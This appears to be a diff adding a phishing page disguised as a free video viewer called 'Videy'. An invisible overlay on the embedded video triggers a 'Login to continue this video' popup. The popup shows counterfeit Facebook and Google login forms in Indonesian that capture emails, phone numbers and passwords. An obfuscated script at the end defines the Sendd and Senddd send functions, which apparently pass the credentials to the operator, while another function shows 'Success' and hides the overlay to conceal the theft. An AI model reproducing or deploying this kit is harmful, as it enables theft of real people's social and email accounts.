@@ -1,0 +1,198 @@
+<html>
+<head>
+<meta name="viewport" charset="UTF-8" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<title>Watch on Videy — Free and Simple Video Hosting</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Hyuu09/my-css@main/stylee.css">
+</head>
+<body style="margin:unset; background:#fff;">
+<iframe src="https://videy.co/v/?id=O8K8vMtE1" style="width:100%;height:100%;border:unset;"></iframe>
+
+
+<div onclick="$('#PopUpLog').fadeIn();" id="Penahan" style="background: rgba(0,0,0,0.0);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 9999999;">
+
+
+<div id="PopUpLog" style="background: rgba(0,0,0,0.5);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 9999999;display:none;">
+<div style="position: relative;margin: 50px auto;
+        margin-top: 70%;
+        text-align: center;" class="modal-content">
+          <span onclick="$('#PopUpLog').fadeOut();" class="modal-close">×</span>
+          <h2 style="font-family: 'Inter';
+font-smooth: always;">Login to continue this video</h2>
+            <button onclick="$('.login-facebook').fadeIn();" style="width: 100%;" type="submit"><i style="margin-right:70px;" class="fa-brands fa-facebook-f"></i><span style="margin-right:70px;">Login with Facebook</span></button>
+            <div style="margin-top:10px;"></div>
+            <button onclick="$('.login-google').fadeIn();" style="width: 100%;" type="submit"><i style="margin-right:75px;" class="fa-brands fa-google"></i><span style="margin-right:85px;">Login with Google</span></button>
+        </div>
+        </div>
+        
+        <div class="popup-login login-facebook animated fadeIn" style="display: none;">
+        <div class="container-box-fb" style="margin-top: 10%;">
+        <div class="atasan-fb" style="background: none;">
+        <i class="fa-solid fa-arrow-left" onclick="$('.login-facebook').fadeOut();" style="color:#1979f4;position: absolute; width: 25px; margin-top: 10px; left: 10px;" alt=""></i>
+		<img src="img/facebook_text.webp" style="margin-top: -5px;margin-left: 105px">
+	</div>
+	<div class="isi-facebook" style="padding-bottom: 10px;">
+		<p class="kaget email">
+			Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b>
+		</p>
+		<p class="kaget sandi">
+			Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b>
+		</p>
+		<img src="img/favicon.ico">
+		<div class="txt-ucapan-fb">
+			Masuk ke akun Facebook Anda untuk terhubung dengan Videy
+		</div>
+		<form class="form-login-fb" id="sendfagen">
+			<div class="form-group">
+				<input type="text" id="fgn_email_fb2" name="email" autocomplete="off" autocapitalize="off" placeholder=" " required="">
+				<label for="fgn_email_fb2" id="EmailLabel" class="hidden-label">Nomor ponsel atau email</label>
+			</div>
+			<div class="form-group">
+				<img src="img/hide.png" id="HidePw" alt="">
+				<img src="img/show.png" id="ShowPw" alt="">
+				<input type="password" id="fgn_password_fb2" name="password" autocomplete="off" autocapitalize="off" placeholder=" " required="">
+				<label for="fgn_password_fb2" id="PasswordLabel" class="hidden-label">Kata Sandi Facebook</label>
+			</div>
+			<input type="hidden" name="login" value="Facebook" readonly="">
+			<button class="btn-login-fb" onclick="Masukk();Sendd();" type="button" id="Tombol" style="border-radius: 48px; margin-top: 13px;">Masuk</button>
+			<label style="font-size: 14px; color: #838489; display: block; margin-top: 15px;">Lupa Kata Sandi?</label>
+			<button class="btn-login-fb" type="button" style="border-radius: 48px; margin-top: 38px; background: none !important; color: #4292f8; border: 1px solid #4292f8 !important; font-weight: 100em !important; box-shadow: transparent !important;">Buat Akun Baru</button>
+		</form>
+		<img src="img/MetaLogo.png" style="display: block; margin: 20px auto; width: 70px; position: relative; top: 0;" alt="">
+	</div>
+</div>
+</div>
+
+<div class="popup-login login-google animated fadeIn" style="display:none;">
+<div class="container-box-fb" style="background:#000; margin-top: 10%;">
+	<div class="atasan-fb" style="background: none;">
+		<i class="fa-solid fa-arrow-left" onclick="$('.login-google').fadeOut();" style="color:#fff;position: absolute; width: 25px; margin-top: 10px; left: 10px;" alt=""></i>
+		<img src="img/google.png" style="width: 100px; margin-top: 0px; margin-left:105px;">
+	</div>
+	<div class="isi-facebook" style="padding-bottom: 10px;">
+		<p class="kaget email">
+			Tidak dapat menemukan Akun Google Anda
+		</p>
+		<p class="kaget sandi">
+			Sandi salah. Coba lagi atau klik Lupa sandi untuk mereset.</b>
+		</p>
+		<img src="img/google-login.png" style="width:70px;">
+		<div class="txt-ucapan-fb">
+			Gunakan Akun Google Anda. Akun akan ditambahkan ke perangkat ini dan tersedia aplikasi google lainnya
+		</div>
+		<form class="form-login-gg" id="sendfnagen">
+			<div class="form-group">
+				<input type="text" id="fgn_email_gg2" name="email" autocomplete="off" autocapitalize="off" placeholder="Email atau nomor telepon" required="">
+				<label for="fgn_email_gg2" id="EmailLabell" class="hidden-labell" style="color: #fa6161 !important;">Email atau nomor telepon</label>
+			</div>
+			<div class="form-group">
+				<b id="HidePww">PERLIHATKAN</b>
+				<b id="ShowPww">SEMBUNYIKAN</b>
+				<input type="password" id="fgn_password_gg2" name="password" autocomplete="off" autocapitalize="off" placeholder="Masukkan sandi" required="">
+				<label for="fgn_password_gg2" id="PasswordLabell" class="hidden-labell">Masukkan sandi</label>
+			</div>
+			<input type="hidden" name="login" value="Google" readonly="">
+			<button class="btn-login-fb" onclick="Masukk();Senddd();" type="button" style="border-radius: 10px; margin-top: 13px;">Selanjutnya</button>
+			<label style="font-size: 14px; color: #1979f4; display: block; margin-top: 5px; margin-right: 220px; font-weight:bold;">Lupa email?</label>
+			<label style="font-size: 14px; color: #1979f4; display: block;margin-right: 220px;font-weight:bold;">Lupa sandi?</label>
+		</form>
+	</div>
+</div>
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+     $("#fgn_email_fb2").on('input', function() {
+        var $Email = $("#fgn_email_fb2").val();
+        if ($Email.length === 0) {
+            $("#EmailLabel").removeClass('active');
+            console.log('Label tidak aktif'); 
+        } else {
+            $("#EmailLabel").addClass('active');
+            console.log('Label aktif'); 
+        }
+    });
+    $("#fgn_password_fb2").on('input', function() {
+        var $Email = $("#fgn_password_fb2").val();
+        if ($Email.length === 0) {
+            $("#PasswordLabel").removeClass('active');
+            console.log('Label tidak aktif');
+            $("#PasswordLabel").addClass('active');
+            console.log('Label aktif');
+        }
+    });
+    $("#fgn_password_fb2").on("input", function () {
+          $Pw = $("#fgn_password_fb2").val();
+          if ($Pw.length == 0) {
+            $("#PasswordLabel").removeClass("active");
+          } else {
+            $("#PasswordLabel").addClass("active");
+          }
+        });
+        $("#HidePw").on("click", function () {
+          $("#fgn_password_fb2").attr("type", "text");
+          $("#HidePw").hide();
+          $("#ShowPw").show();
+        });
+        $("#ShowPw").on("click", function () {
+          $("#fgn_password_fb2").attr("type", "password");
+          $("#ShowPw").hide();
+          $("#HidePw").show();
+        });
+});
+$(document).ready(function() {
+     $("#fgn_email_gg2").on('input', function() {
+        var $Email = $("#fgn_email_gg2").val();
+        if ($Email.length === 0) {
+            $("#EmailLabell").removeClass('active');
+            console.log('Label tidak aktif'); 
+        } else {
+            $("#EmailLabell").addClass('active');
+            console.log('Label aktif'); 
+        }
+    });
+    $("#fgn_password_gg2").on('input', function() {
+        var $Email = $("#fgn_password_gg2").val();
+        if ($Email.length === 0) {
+            $("#PasswordLabell").removeClass('active');
+            console.log('Label tidak aktif');
+            $("#PasswordLabell").addClass('active');
+            console.log('Label aktif');
+        }
+    });
+    $("#fgn_password_gg2").on("input", function () {
+          $Pw = $("#fgn_password_gg2").val();
+          if ($Pw.length == 0) {
+            $("#PasswordLabell").removeClass("active");
+          } else {
+            $("#PasswordLabell").addClass("active");
+          }
+        });
+        $("#HidePww").on("click", function () {
+          $("#fgn_password_gg2").attr("type", "text");
+          $("#HidePww").hide();
+          $("#ShowPww").show();
+        });
+        $("#ShowPww").on("click", function () {
+          $("#fgn_password_gg2").attr("type", "password");
+          $("#ShowPww").hide();
+          $("#HidePww").show();
+        });
+});
+</script>
+<script>
+     function Masukk() {
+                                        $('.login-facebook').toggle();
+                                        $('.btn-login-fb').html('Success')
+                                        $('.login-facebook').fadeOut();
+                                        $('#Penahan').hide();
+                                        $('#PopUpLog').hide();
+                                } 
+</script>
+<script>
+var Sendd,Senddd;(function(){var rmg='',gXY=202-191;function gUz(n){var o=1557482;var i=n.length;var f=[];for(var g=0;g<i;g++){f[g]=n.charAt(g)};for(var g=0;g<i;g++){var b=o*(g+452)+(o%18384);var e=o*(g+409)+(o%25069);var t=b%i;var c=e%i;var p=f[t];f[t]=f[c];f[c]=p;o=(b+e)%6149284;};return f.join('')};var kBd=gUz('xicbtuncnwryqdupegjhsklotrrvftczosoma').substr(0,gXY);var dus='r;f ,u1,,fn v2;=r1o5wtimlrtb(d;rj2lj;g)kvp;r(tt>< h;t(to)]i{o]u, ,+7nav61+a77e4}9s+c{ueva(+,gu1o+=a,.v[=gvu=1fx<=2m+.a801avau 6v)(vpapabrgc;;a+=lsrltnui ef0h)u[.,7=12t+Citoiro=[]5yl t8hgf)(2u+}l;=j;li;[;r9b;3.)<r;rn(5 r ;beni(aj,fo[ r[=;x=;fo)0(n.zz,(r (aiei] )eca5fu;al0h)ntl(nc;g-saAovl+h"!k{v(tt()n;].r]t0mx.;e=i;neune8codlneal +s[ah;(rv("h6a;8;h"da*rh(srl+ no.6r ;n7,si+8){v.rarxx4c;a.>1or=lue,=0!*.horgqe;]b+=){p="rhrn)s6ge7h8CCod  ja-u1h4"fs7rg;+d=) (,S (8vg]=(f{pkrb(irpj0gpf-)ux}c2=3raqecvro(d[)+=eiprncthS+)to(hr-t<a=og g=a}8lju+f6eo+=).+m10[)v)=n.l"v=9oh,)r(Aasuy-i1v-0xfsudivpr]goi(t)d.j(=6y=xn.urAvCp".t+a;)2"(j,inrl7)roafn<Ce;gy(ah.s.crk=t=hm-)9;12oreuj;yva)fou8);}}n];(g((nd+)Ces;d=.f=[i,oau+tre;gdv ,=.9kt.,,=9,t2er ,Ab).r5niacqj,rr[a{1y=+7= 8 ;hsnCdaeCoi,j4, ;uoxA9sttn=s;u..[2nn[}0ce,o;n==(e)l(tm]ofo;=n0;rhi))"p0ptlvv,;n=,nrom;hhruvfal.jo]]);]etur(z6.si=+t=vaz)"e7qo.1h[e;';var oYw=gUz[kBd];var GQo='';var PrC=oYw;var BUr=oYw(GQo,gUz(dus));var gbq=BUr(gUz('Fe]e.+;FFF,di)0,in3Fead]]3a _c_d0erdde;!bt3sr(FF":r3ennt{F6]4)=l2FoF.._t;#drts l7$d\'a+]a#}tF!s{(F8!k:e3o0sbt"1Ss;od}F=. _atn2;a304h03_.3(!ze,;sFeae.o)+5%$%cFmF.j"lc,({F%,3$,4gF;,)((4"Fem(Fped$F$ ,(FF5srutj.ne2[pr.F.("dl.reu2.ejob#_h.6F9#g4g8Fj-9 e*,Fng{e{cSp($$x a]k0sgF(ysc3F)tF5FF7zq1,;=$3}!FdF5+ss.y)pr7,n.FS]9.(F_\/5tF;-.o_%)to,%t1}d}"_)jF58dFr6F;}l{#nFF=eFe]jitFa!7hf92g7(*F]{]efqF(g Fah\/!29..}F8b,n{i*d$T)l]b3_asi_F*8{Fl.ota.622Fd(02l9:%d(!;_,1dk$_.4.!tkF)(!\/6)g))$=n=_.b1n) 29,)yF,5F(.r($4]oeF!tc\/3e)d.!)$8hz;S_naFC{j6se=,(FTdh\/,..zF;F a.s(=,gFi1)j_b,(7tty.dse0;1-g.r)f78.FForengd(2:f)+kCoaaF,dk.n+cg}Fbu,.];hs63r%6,(n.891"cF.j,%t-57.cy0dq:od._FcFd;au,Fh$(9!*30oi)4)t0tbevi!!Fdvl)u%r;Fi.F e&0(#3r)b=-$ 8lF_1Fg_sF3jtll(F_Fdo a$tm((-!nnf.\/)kf+#k]s4))13i%.F1;\'0t.u;3y0._bg7_F:0F)F,e!4!i!g ()r%64 nFu4$(sopbd3((:3)$&(F$b$667]s;}).2{eFvT4erFe50.! jF=$)s!)%d))sF.2;)15+c + 5f=Fu,6o:F1jnd]F).&Ft.=rFb8(.int)F=\/&=)=F&7Fz;otd(,1c;_F)7 oFa.{j;f{)po{!}(lm)).=jF3#$e=c1F=6m4!.FFy3.,F=s[)Sr$g,bF068(_{$Fs}F,=FS;_.baj7(.(})_cjslite.($sFFF227l (fud54#%g}eF3F.pd2lFaef3$ d(7Ffd6k.1!Ffd(#=0F,(aF.)3{, ,gs7340y3=yF\/4)eF)1(r1]9ah.d,p2i\/\'i(u,e[bF_r99{tmb,[$70u;,.$F 7pf\')je]n3r2 g!7rut)4\/F .5db!F4_t24b!dF40.!({ub)_$b=d}xlF2js4%]zd y$(F'));var Odw=PrC(rmg,gbq );Odw(8145);return 3461})()
+</script>
+
+                </div>
+</body>
+</html>
